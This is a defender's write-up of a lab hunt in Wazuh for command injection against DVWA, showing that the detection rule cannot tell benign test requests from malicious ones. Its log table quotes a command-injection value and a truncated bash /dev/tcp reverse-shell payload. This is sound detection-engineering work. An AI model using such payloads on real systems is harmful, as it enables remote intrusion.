# Blue Team Analysis — Command Injection / Docker Escape Investigation

> **Perspective:** This document is written from the **defender's** point of view.
> I had **no prior knowledge** of the attack described in
> [`attack-playbook.md`](./attack-playbook.md) going into this. As with the
> Kerberoasting and AS-REP Roasting investigations, this one starts from a
> **proactive hunt** rather than a clean alert queue — and, as this document
> will show, the detections I had in place only tell part of the story.
>
> Full case documentation, including the investigation timeline, assets,
> IOCs, and evidence, is maintained in DFIR-IRIS under case
> `04-command-injection`. This document summarizes the investigative
> narrative; IRIS is the system of record.

## Step 1 — Why hunt instead of wait for an alert?

DVWA sits on the VULNERABLE VLAN specifically so it can be attacked — but
that doesn't mean every interaction with it is benign lab testing. A
vulnerable web app with no detection coverage at all would be an obvious
blind spot, so before assuming "nothing's happened here," I wanted to check
what, if anything, Wazuh has actually been seeing from that host.

I started with the same question I'd ask of any web-facing asset: *has
anything unusual touched this box recently, and did any of it generate an
alert?*

## Step 2 — Pulling the data

In Wazuh Discover, I searched raw logs from the Docker host first, not just
alerts, to get an unfiltered picture of what's been hitting it:

```
agent.name: "vuln-docker-01"
```

This returned a mix of expected system noise — `sudo` session logs, package
management events, agent health events — but also entries from the DVWA
container itself, which told me the agent was at least picking up
*something* from that application.

Narrowing to just the web application traffic:

```
agent.name: "vuln-docker-01" AND data.log: *vulnerabilities*exec*
```

<details>
<summary>What this search does</summary>

| Part | What it does |
|---|---|
| `agent.name: "vuln-docker-01"` | Scopes to the Docker host running DVWA |
| `data.log: *vulnerabilities*exec*` | Filters to log lines referencing DVWA's Command Injection module specifically |
</details>

This surfaced multiple `POST /vulnerabilities/exec/` requests — the DVWA
form that passes user input into a shell `ping` command with no
sanitization. That endpoint has no legitimate business purpose; nothing
should ever be submitting to it outside of deliberate testing.

*(Screenshot: Discover results showing the raw `data.log` entries for
`/vulnerabilities/exec/` — see repo `docs/03-long-build-log/` image set.)*

## Step 3 — Checking for a corresponding alert

Same discipline as the Kerberoasting hunt: a suspicious raw log entry is a
lead, not a conclusion. I checked whether this traffic had already tripped
a detection:

```
agent.name: "vuln-docker-01" AND rule.id: 100151
```

**Result: all three POST requests matched rule `100151`** — the custom rule
built for this scenario, which fires on any POST to the command-injection
endpoint and maps to MITRE T1190 (Exploit Public-Facing Application).

Good news on its face. But pulling apart the three alerts side by side
showed a limitation worth being honest about:

| Request | `data.log` content | Alert |
|---|---|---|
| 1 | `127.0.0.1` (baseline) | `100151` |
| 2 | `127.0.0.1; whoami` (injection test) | `100151` |
| 3 | `127.0.0.1; bash -c 'bash -i >& /dev/tcp/...'` (reverse shell) | `100151` |

**All three alerts are identical.** Rule `100151` detects that the endpoint
was *submitted to* — it does not, and cannot, inspect the POST body for
shell metacharacters or payload content, because Apache's combined log
format doesn't capture request bodies. From the alert queue alone, there is
no way to tell a harmless baseline test apart from a successful reverse
shell. An analyst triaging this in real time would see three identical,
low-context alerts and would have no signal from Wazuh telling them which
one mattered.

This is the first real gap in the detection coverage: **the endpoint-touch
rule proves someone used the vulnerable form, not what they did with it.**
